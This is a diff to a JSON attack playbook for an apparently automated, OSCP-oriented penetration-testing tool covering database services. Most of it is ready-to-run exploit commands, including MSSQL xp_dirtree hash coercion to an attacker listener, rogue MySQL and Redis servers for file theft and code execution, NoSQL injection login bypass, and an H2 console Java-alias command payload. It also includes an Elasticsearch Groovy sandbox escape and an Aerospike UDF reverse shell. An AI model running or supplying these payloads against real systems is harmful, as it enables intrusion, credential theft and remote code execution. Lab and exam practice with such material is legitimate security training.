@@ -1,7 +1,7 @@
 {
   "name": "Database service enumeration & access (§3)",
   "description": "Enumerate, log into, and (carefully, exam-safe) exploit exposed database services: MySQL/MariaDB, MSSQL, PostgreSQL, Redis, and MongoDB. Enumeration and login run automatically; OS command execution such as xp_cmdshell is only crafted and handed off, never auto-fired.",
-  "source": "OSCP methodology (project-authored, obol-local)",
+  "source": "OSCP methodology",
   "actions": [
     {
       "id": "mysql-login",
@@ -39,7 +39,8 @@
           "tool": "mysql",
           "run": "mysql -h {{target}} -u root --password= -e 'SHOW DATABASES;'"
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "mysql-loot",
@@ -68,7 +69,8 @@
           "tool": "mysql",
           "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT username,password FROM users;' {{database}}"
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "mssql-login",
@@ -113,8 +115,19 @@
           "tool": "mssqlclient.py",
           "run": "mssqlclient.py {{user}}:{{password}}@{{target}}",
           "note": "Interactive SQL prompt with a local SQL login (no -windows-auth)."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' -q \"EXEC master..xp_dirtree '\\\\{{lhost}}\\share'\"",
+          "note": "MSSQL xp_dirtree coerced authentication: Coerces the MSSQL service account to authenticate over SMB to your Responder/listener on {{lhost}}. Works with unprivileged SQL accounts without sysadmin/xp_cmdshell rights."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' --local-auth -q \"EXEC master..xp_dirtree '\\\\{{lhost}}\\share'\"",
+          "note": "MSSQL xp_dirtree coerced SMB auth using local/SQL authentication (--local-auth). Captures NetNTLMv2 hash of the MSSQL service account without domain account requirement."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "mssql-xp-cmdshell",
@@ -187,7 +200,8 @@
           "tool": "psql",
           "run": "PGPASSWORD={{password}} psql -h {{target}} -U {{user}} -c '\\l'"
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "postgres-rce",
@@ -270,7 +284,8 @@
           "tool": "redis-cli",
           "run": "redis-cli -h {{target}} KEYS '*'"
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "mongo-enum",
@@ -321,7 +336,8 @@
           "run": "python3 -c 'from pymongo import MongoClient; c=MongoClient(\"{{target}}\", 27017, serverSelectionTimeoutMS=5000); [print(d) for d in c[\"admin\"][\"users\"].find().limit(50)]'",
           "note": "dump a collection, set the db/collection from the step above (here admin.users); reads any stored credentials"
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "oracle-tns",
@@ -373,7 +389,8 @@
           "run": "sqlplus {{user}}/{{password}}@{{target}}:1521/{{sid}}",
           "note": "Log in with a found credential; from a privileged account odat utlfile/externaltable then reads, writes, and runs code."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "oracle-rce",
@@ -464,7 +481,8 @@
           "run": "curl -s 'http://{{target}}:9200/{{index}}/_search?pretty&size=100'",
           "note": "Dump documents from an index; stored records routinely include usernames and secrets."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "elasticsearch-rce",
@@ -505,7 +523,8 @@
           "run": "curl -s 'http://{{target}}:9200/_search?pretty' -d '{\"size\":1,\"script_fields\":{\"x\":{\"lang\":\"groovy\",\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'",
           "note": "CVE-2015-1427 Groovy sandbox escape: the response embeds the command output. `uid=...` is the foothold; swap id for a reverse shell and catch it with the listener card."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "memcached-enum",
@@ -553,7 +572,8 @@
           "run": "ncat {{target}} 11211",
           "note": "Interactive: send `stats items`, then `stats cachedump <slab> 0` to list keys, then `get <key>` to read a value."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "mssql-linked-server",
@@ -661,6 +681,326 @@
           "tool": "mysql",
           "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e \"CREATE FUNCTION sys_exec RETURNING INT SONAME 'lib_mysqludf_sys.so'\"",
           "note": "UDF fallback when the web root is not writable: load the library, then SELECT sys_exec('id > /tmp/o')."
+        }
+      ]
+    },
+    {
+      "id": "adminer-mysql-fileread",
+      "title": "Adminer Rogue MySQL Client Arbitrary File Read",
+      "hypothesis": "Adminer database management interfaces allow connecting to remote MySQL databases. When Adminer connects to a rogue MySQL server, the server issues a LOAD DATA LOCAL INFILE request to retrieve arbitrary local files from the Adminer server host.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable"
+      ],
+      "produces": [
+        "credential.available",
+        "loot.credentials"
+      ],
+      "priority": 74,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "arbitrary local file extraction from the web server via rogue MySQL server LOAD DATA LOCAL INFILE",
+      "does_not_prove": "code execution directly without write primitives or leaked credentials",
+      "report": {
+        "finding": "Adminer Arbitrary File Disclosure via Rogue MySQL Connection",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/allyshka/Rogue-MySql-Server"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "python3 rogue_mysql_server.py --port 3306 --file /var/www/html/index.php",
+          "note": "Starts rogue MySQL listener requesting specified target file via LOAD DATA LOCAL INFILE when client connects."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/adminer.php?server={{lhost}}&username=root&db=test' -d 'auth[driver]=server&auth[server]={{lhost}}&auth[username]=root&auth[password]=root&auth[db]=test'",
+          "note": "Connects Adminer web portal to rogue MySQL listener to initiate local file read."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "redis-rogue-server-rce",
+      "title": "Redis Rogue Server Master Replication RCE",
+      "hypothesis": "Unauthenticated or authenticated Redis servers (versions 4.x and 5.x) allow loading external C shared library modules via the MODULE LOAD command. An attacker connects to Redis and sets SLAVEOF pointing to a rogue Redis server, which synchronizes a malicious .so file to disk, achieving instant arbitrary code execution.",
+      "tool": "redis-cli",
+      "tools": [
+        "redis-cli",
+        "python3"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "port:6379",
+        "service.redis"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 83,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "arbitrary code execution via Redis rogue master replication and module loading",
+      "does_not_prove": "exploitation on Redis 6.0+ with ACL restrictions or module loading disabled",
+      "report": {
+        "finding": "Redis Unauthenticated Master Replication Remote Code Execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/n0b0dyCN/redis-rogue-server"
+      ],
+      "commands": [
+        {
+          "tool": "redis-cli",
+          "run": "redis-cli -h {{target}} info",
+          "note": "Inspects target Redis server configuration, version, and authentication state."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 redis-rogue-server.py --rhost {{target}} --lhost {{lhost}} --lport 6379 --exp exp.so",
+          "note": "Executes rogue Redis master replication attack to upload module and execute interactive shell."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "nosqli-regex-extract",
+      "title": "MongoDB NoSQL Injection Regex Credential Extraction",
+      "hypothesis": "Web applications querying MongoDB or DocumentDB using unparsed input objects ($ne, $regex) allow attackers to bypass authentication and extract secret strings character-by-character using regular expression evaluation ($regex: '^a.*').",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "curl"
+      ],
+      "os": [],
+      "phase": "access",
+      "requires_any": [
+        "http.reachable",
+        "web.tech"
+      ],
+      "produces": [
+        "credential.available",
+        "loot.credentials"
+      ],
+      "priority": 76,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "authentication bypass and character-by-character credential recovery via NoSQL injection",
+      "does_not_prove": "exploitation when input types are strictly cast or parameterized",
+      "report": {
+        "finding": "MongoDB NoSQL Blind Injection Credential Recovery",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -d 'username[$ne]=admin&password[$ne]=admin&login=login' http://{{target}}/login.php",
+          "note": "Tests for NoSQL injection authentication bypass using the $ne not-equal operator."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 nosql_extract.py --url http://{{target}}/login.php --field password --user admin",
+          "note": "Iterates character-by-character using $regex matching to recover complete cleartext passwords."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "h2-database-console-rce",
+      "title": "H2 Database Web Console SQL Query Java Alias RCE",
+      "hypothesis": "Exposed H2 Database Web Console allows authenticated or default-login users to execute SQL queries. Creating a Java alias function executing Runtime.getRuntime().exec invokes arbitrary system commands.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.h2_console",
+        "port:8082"
+      ],
+      "produces": [
+        "foothold.shell"
+      ],
+      "priority": 82,
+      "phase": "access",
+      "proves": "demonstrates arbitrary command execution via H2 database Java function alias creation",
+      "does_not_prove": "administrative operating system privileges without local privesc",
+      "report": {
+        "finding": "H2 Database Web Console Java Code Execution",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/49384"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -d \"sql=CREATE ALIAS EXEC AS \\$\\$String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\"\\\\A\\\"); return s.hasNext() ? s.next() : \\\"\\\"; }\\$\\$; CALL EXEC('{{command}}');\" 'http://{{target}}:8082/query.do'",
+          "note": "Execute Java system runtime commands via H2 Database Web Console SQL query alias definition."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -d \"language=en&driver=org.h2.Driver&url=jdbc:h2:mem:test_db&user=sa&password=\" 'http://{{target}}:8082/login.do'",
+          "note": "Authenticate to exposed H2 Database Web Console port 8082 using default or identified database credentials."
+        }
+      ]
+    },
+    {
+      "id": "oracle-tns-odat-rce",
+      "title": "Oracle Database TNS ODAT DBMS_SCHEDULER Execution",
+      "hypothesis": "Oracle Database TNS listener running on port 1521 allows valid or default database credentials (scott:tiger, sys:change_on_install) to execute operating system commands via DBMS_SCHEDULER packages using ODAT.",
+      "tool": "odat",
+      "tools": [
+        "odat"
+      ],
+      "os": [
+        "windows",
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.oracle_tns",
+        "port:1521"
+      ],
+      "produces": [
+        "access.system",
+        "foothold.windows"
+      ],
+      "priority": 86,
+      "phase": "access",
+      "proves": "executes operating system commands as the Oracle service account via DBMS_SCHEDULER",
+      "does_not_prove": "domain administrative rights beyond the local database host",
+      "report": {
+        "finding": "Oracle TNS Database Administrative Command Execution via ODAT",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/quentinhardy/odat"
+      ],
+      "commands": [
+        {
+          "tool": "odat",
+          "run": "odat dbmsscheduler -s {{target}} -p 1521 -d {{oracle_sid}} -U {{user}} -P {{password}} --sysdba --exec \"cmd.exe /c {{command}}\"",
+          "note": "Execute operating system commands via Oracle DBMS_SCHEDULER package with administrative privileges."
+        },
+        {
+          "tool": "odat",
+          "run": "odat sidguesser -s {{target}} -p 1521",
+          "note": "Enumerate active Oracle Database System Identifiers (SIDs) using dictionary and ping probes."
+        }
+      ]
+    },
+    {
+      "id": "aerospike-udf-rce",
+      "title": "Aerospike Database Unauthenticated Lua UDF Remote Code Execution (CVE-2020-13151)",
+      "hypothesis": "Target runs Aerospike database server versions <= 5.1.0.6 on port 3000. An unauthenticated client can register a custom Lua User Defined Function (UDF) that invokes os.execute, achieving remote code execution as user aerospike.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "nc"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.aerospike",
+        "vuln.aerospike_udf",
+        "port:3000"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "priority": 88,
+      "phase": "access",
+      "proves": "command execution and shell access as aerospike user via Lua UDF registration",
+      "does_not_prove": "root privileges on the database host until local privesc is completed",
+      "report": {
+        "finding": "Unauthenticated Remote Command Execution in Aerospike Database (CVE-2020-13151)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/b4ny4n/CVE-2020-13151",
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13151"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "nc -nv {{target}} 3000",
+          "note": "Probe Aerospike database service on TCP port 3000 to verify connectivity and banner responsiveness."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport {{lport}}",
+          "note": "Register malicious Lua UDF and execute reverse shell payload connecting back to Kali listener."
+        }
+      ]
+    },
+    {
+      "id": "sqlite-table-extract",
+      "title": "Exposed SQLite Database Table Extraction and Credential Recovery",
+      "hypothesis": "Web enumeration or directory indexing discovered an exposed SQLite database file (.db/.sqlite). Dumping table schemas and extracting table contents yields stored user credentials, password hashes, or API secrets.",
+      "tool": "sqlite3",
+      "tools": [
+        "sqlite3"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "loot.files",
+        "web.exposed_artifact",
+        "loot.material"
+      ],
+      "produces": [
+        "credential.plain",
+        "credential.candidate",
+        "hash.candidate"
+      ],
+      "priority": 86,
+      "phase": "findings",
+      "proves": "recovers cleartext credentials or crackable password hashes from exposed SQLite database tables",
+      "does_not_prove": "interactive database write access or remote code execution directly through SQLite",
+      "report": {
+        "finding": "Sensitive User Credentials Exposed in Downloadable SQLite Database File",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.sqlite.org/cli.html"
+      ],
+      "commands": [
+        {
+          "tool": "sqlite3",
+          "run": "sqlite3 {{db_file}} \".tables\" && sqlite3 {{db_file}} \".schema {{table}}\"",
+          "note": "Enumerate table names and column schemas from recovered SQLite database file."
+        },
+        {
+          "tool": "sqlite3",
+          "run": "sqlite3 {{db_file}} \"SELECT * FROM {{table}};\"",
+          "note": "Dump all rows from target database table to extract user accounts and password hashes."
         }
       ]
     }
